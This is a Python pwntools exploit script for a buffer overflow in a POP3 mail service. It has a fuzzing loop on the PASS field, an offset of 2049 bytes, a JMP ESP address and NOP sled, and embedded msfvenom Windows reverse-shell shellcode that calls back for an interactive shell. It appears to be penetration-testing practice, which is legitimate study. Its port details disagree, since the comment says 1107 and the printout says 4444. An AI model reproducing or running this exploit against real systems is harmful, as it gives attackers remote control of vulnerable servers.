#!/usr/bin/python

import sys
from pwn import *
import time

ip = "192.168.0.243"
port = 110

#--- Debugging Option For Developer ---#
#context.log_level = "debug"

#--- Shellcode ---#
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.243 LPORT=1107 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai
shellcode =  b""
shellcode += b"\xda\xcd\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x52\xba"
shellcode += b"\xb5\x26\x71\x1c\x83\xef\xfc\x31\x57\x13\x03\xe2"
shellcode += b"\x35\x93\xe9\xf0\xd2\xd1\x12\x08\x23\xb6\x9b\xed"
shellcode += b"\x12\xf6\xf8\x66\x04\xc6\x8b\x2a\xa9\xad\xde\xde"
shellcode += b"\x3a\xc3\xf6\xd1\x8b\x6e\x21\xdc\x0c\xc2\x11\x7f"
shellcode += b"\x8f\x19\x46\x5f\xae\xd1\x9b\x9e\xf7\x0c\x51\xf2"
shellcode += b"\xa0\x5b\xc4\xe2\xc5\x16\xd5\x89\x96\xb7\x5d\x6e"
shellcode += b"\x6e\xb9\x4c\x21\xe4\xe0\x4e\xc0\x29\x99\xc6\xda"
shellcode += b"\x2e\xa4\x91\x51\x84\x52\x20\xb3\xd4\x9b\x8f\xfa"
shellcode += b"\xd8\x69\xd1\x3b\xde\x91\xa4\x35\x1c\x2f\xbf\x82"
shellcode += b"\x5e\xeb\x4a\x10\xf8\x78\xec\xfc\xf8\xad\x6b\x77"
shellcode += b"\xf6\x1a\xff\xdf\x1b\x9c\x2c\x54\x27\x15\xd3\xba"
shellcode += b"\xa1\x6d\xf0\x1e\xe9\x36\x99\x07\x57\x98\xa6\x57"
shellcode += b"\x38\x45\x03\x1c\xd5\x92\x3e\x7f\xb2\x57\x73\x7f"
shellcode += b"\x42\xf0\x04\x0c\x70\x5f\xbf\x9a\x38\x28\x19\x5d"
shellcode += b"\x3e\x03\xdd\xf1\xc1\xac\x1e\xd8\x05\xf8\x4e\x72"
shellcode += b"\xaf\x81\x04\x82\x50\x54\x8a\xd2\xfe\x07\x6b\x82"
shellcode += b"\xbe\xf7\x03\xc8\x30\x27\x33\xf3\x9a\x40\xde\x0e"
shellcode += b"\x4d\xaf\xb7\x10\x7e\x47\xca\x10\x84\xcb\x43\xf6"
shellcode += b"\xee\xfb\x05\xa1\x86\x62\x0c\x39\x36\x6a\x9a\x44"
shellcode += b"\x78\xe0\x29\xb9\x37\x01\x47\xa9\xa0\xe1\x12\x93"
shellcode += b"\x67\xfd\x88\xbb\xe4\x6c\x57\x3b\x62\x8d\xc0\x6c"
shellcode += b"\x23\x63\x19\xf8\xd9\xda\xb3\x1e\x20\xba\xfc\x9a"
shellcode += b"\xff\x7f\x02\x23\x8d\xc4\x20\x33\x4b\xc4\x6c\x67"
shellcode += b"\x03\x93\x3a\xd1\xe5\x4d\x8d\x8b\xbf\x22\x47\x5b"
shellcode += b"\x39\x09\x58\x1d\x46\x44\x2e\xc1\xf7\x31\x77\xfe"
shellcode += b"\x38\xd6\x7f\x87\x24\x46\x7f\xf4\x9a\x56\xea\xfa"
shellcode += b"\x09\x56\x3f"

def check_connection(ip,port):
    p = remote(ip,port)
    response = p.recvline()
    
    if response:
        print("Connect Success")
        return True
    else:
        print("Connect Failed")
        sys.exit()
        return False
    
    p.close()

context.log_level = "error"   
#context.log_level = "debug" 
def fuzzing(ip,port):
    find_offset = b'A'
    while True:
        p = remote(ip,port)
        p.recvuntil("OK POP3")
        p.send('USER username ' + '\r\n')

        data = p.recv(1024)
        find_offset += b'A'*50
        pay = b'PASS ' + find_offset + b'\r\n'
        p.send(pay)
        p.recvline()
        print("Send Data Length: " + str(len(pay)))
        result = p.recvline()
        if result == b'-ERR unable to lock mailbox\r\n':
            p.close()
        else:
            print("Fuzzing Crash: " + str(len(pay)))
            p.close()
            return len(pay)

def exploit(ip,port):

    p = remote(ip,port)
    p.recvuntil("OK POP3")
    p.send('USER username ' + '\r\n')
    p.recvline()

    offset = 2049
    jmp = b'\x8f\x35\x4a\x5f' #JUMP ESP 0x5f4a358f
    nops = b'\x90'*16 # FOR NOP SLED ATTACK
    pay = b'\x41'*offset + jmp + nops + shellcode
    
    #Go Exploit
    print("Go Exploit...")
    print("HOST: " + ip)
    print("ReverShell PORT: 4444 ")
    
    p.send(pay)
    p.interactive()

    
def main():
    
    check_connect = check_connection(ip,port)
    
    if check_connect == True:
        #offset = fuzzing(ip,port)
        exploit(ip,port)

    
    
if __name__ == "__main__":
    main()
    
